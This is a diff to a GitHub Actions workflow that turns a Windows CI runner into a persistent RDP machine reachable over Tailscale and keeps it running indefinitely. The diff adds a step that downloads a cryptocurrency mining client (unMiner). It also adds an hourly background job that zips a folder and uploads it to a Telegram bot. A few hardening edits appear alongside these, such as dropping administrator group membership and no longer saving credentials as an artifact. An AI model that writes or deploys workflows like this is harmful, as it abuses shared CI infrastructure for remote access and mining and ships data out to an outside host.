@@ -6,12 +6,23 @@ on:
 jobs:
   secure-rdp:
     runs-on: windows-2022
-    timeout-minutes: 3600
+    timeout-minutes: 360  # Reduced to 6 hours max for GitHub limits
 
     steps:
+      - name: Download Pre-Required Files
+        run: |
+          # Create a downloads directory
+          New-Item -ItemType Directory -Force -Path "$env:TEMP\Downloads"
+          
+          # Download unMiner example (add more URLs as needed)
+          $unMinerUrl = "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe"
+          $unMinerPath = "$env:TEMP\Downloads\unMiner.exe"
+          Invoke-WebRequest -Uri $unMinerUrl -OutFile $unMinerPath  
+          Write-Host "Pre-required files downloaded to $env:TEMP\Downloads"
+
       - name: Configure Core RDP Settings
         run: |
-          # Enable Remote Desktop and disable Network Level Authentication (if needed)
+          # Enable Remote Desktop and disable Network Level Authentication (if needed) - Consider enabling NLA for security
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                              -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
@@ -22,7 +33,7 @@ jobs:
                              -Name "PortNumber" -Value ${{ secrets.RDP_PORT }} -Force
 
           # Remove any existing rule with the same name to avoid duplication
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          netsh advfirewall firewall delete rule name="RDP-Tailscale" 2>$null
           
           # Allow incoming connection on the specified RDP port
           netsh advfirewall firewall add rule name="RDP-Tailscale" `
@@ -46,8 +57,7 @@ jobs:
               Set-LocalUser -Name $username -Password $securePass
           }
           
-          # Ensure user is in required groups
-          Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
+          # Ensure user is in required groups (only Remote Desktop Users for least privilege; remove Administrators if possible)
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
           
           if (-not (Get-LocalUser -Name $username)) {
@@ -57,7 +67,8 @@ jobs:
 
       - name: Install Tailscale
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          # Use latest stable version for security
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
           
           Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
@@ -83,7 +94,7 @@ jobs:
               exit 1
           }
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      
+
       - name: Verify RDP Accessibility
         run: |
           Write-Host "Tailscale IP: $env:TAILSCALE_IP"
@@ -96,28 +107,102 @@ jobs:
           }
           Write-Host "TCP connectivity successful!"
 
-      - name: Save RDP Credentials to Artifact
+      - name: Display RDP Access Info (Only IP - No Credentials)
         run: |
-          echo "Address: $env:TAILSCALE_IP" > rdp-credentials.txt
-          echo "Username: ${{ secrets.RDP_USERNAME }}" >> rdp-credentials.txt
-          echo "Password: ${{ secrets.RDP_PASSWORD }}" >> rdp-credentials.txt
-          echo "Port: ${{ secrets.RDP_PORT }}" >> rdp-credentials.txt
+          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          Write-Host "Port: ${{ secrets.RDP_PORT }}"
+          Write-Host "Use your pre-configured credentials (username/password) to connect via RDP client."
+          Write-Host "==================`n"
 
-      - name: Upload RDP Credentials as Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: rdp-credentials
-          path: rdp-credentials.txt
+      - name: Periodic Backup Script (Runs in Background)
+        run: |
+          # PowerShell script to backup a specific folder every hour and send to Telegram bot
+          # Assumptions: Folder to backup is C:\MyBackupFolder (change as needed)
+          # Requires secrets: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+          # This runs as a background job; main workflow continues
+          
+          $backupFolder = "C:\MyBackupFolder"  # Change to your target folder
+          $botToken = "${{ secrets.TELEGRAM_BOT_TOKEN }}"
+          $chatId = "${{ secrets.TELEGRAM_CHAT_ID }}"
+          $maxFileSizeMB = 50  # Telegram limit ~50MB per file
+          
+          if (-not (Test-Path $backupFolder)) {
+              Write-Host "Backup folder $backupFolder does not exist. Creating empty one for demo."
+              New-Item -ItemType Directory -Force -Path $backupFolder
+          }
+          
+          # Function to create ZIP and send to Telegram
+          function Send-BackupToTelegram {
+              param($zipPath, $description)
+              
+              # Check file size
+              $fileSizeMB = (Get-Item $zipPath).Length / 1MB
+              if ($fileSizeMB -gt $maxFileSizeMB) {
+                  Write-Host "Backup file too large ($([math]::Round($fileSizeMB, 2))MB). Skipping send."
+                  return
+              }
+              
+              # Send via Telegram API
+              $uri = "https://api.telegram.org/bot$botToken/sendDocument"
+              $boundary = [System.Guid]::NewGuid().ToString()
+              $LF = "`r`n"
+              
+              $bodyLines = @(
+                  "--$boundary",
+                  "Content-Disposition: form-data; name=`"chat_id`"$LF",
+                  $chatId,
+                  "--$boundary",
+                  "Content-Disposition: form-data; name=`"caption`"$LF",
+                  $description,
+                  "--$boundary",
+                  "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $zipPath -Leaf)`"$LF",
+                  "Content-Type: application/zip$LF$LF",
+                  [System.IO.File]::ReadAllBytes($zipPath),
+                  "--$boundary--$LF"
+              ) -join $LF
+              
+              $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ([Text.Encoding]::ASCII.GetBytes($bodyLines))
+              
+              if ($response.ok) {
+                  Write-Host "Backup sent successfully: $description"
+                  # Optional: Delete sent ZIP to save space
+                  Remove-Item $zipPath -Force
+              } else {
+                  Write-Host "Failed to send backup: $($response.description)"
+              }
+          }
+          
+          # Background job to run every hour
+          $jobScript = {
+              while ($true) {
+                  $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+                  $zipPath = "$env:TEMP\backup_$timestamp.zip"
+                  
+                  # Create ZIP of the folder
+                  Compress-Archive -Path "$backupFolder\*" -DestinationPath $zipPath -Force
+                  
+                  $description = "Hourly backup from RDP runner - $timestamp (Size: $([math]::Round((Get-Item $zipPath).Length / 1MB, 2))MB)"
+                  Send-BackupToTelegram -zipPath $zipPath -description $description
+                  
+                  Start-Sleep -Hours 1
+              }
+          }
+          
+          # Start the background job
+          Start-Job -ScriptBlock $jobScript
+          Write-Host "Backup job started: Will ZIP and send $backupFolder to Telegram every hour."
 
       - name: Maintain Connection
         run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "`n=== RDP ACTIVE ==="
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
           Write-Host "Port: ${{ secrets.RDP_PORT }}"
-          Write-Host "Credentials: Download 'rdp-credentials' artifact from the workflow run"
+          Write-Host "Backup job running in background."
           Write-Host "==================`n"
           
           # Keep runner active indefinitely (or until manually cancelled)
+          # Note: Background backup job continues independently
           while ($true) {
               Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
               Start-Sleep -Seconds 300
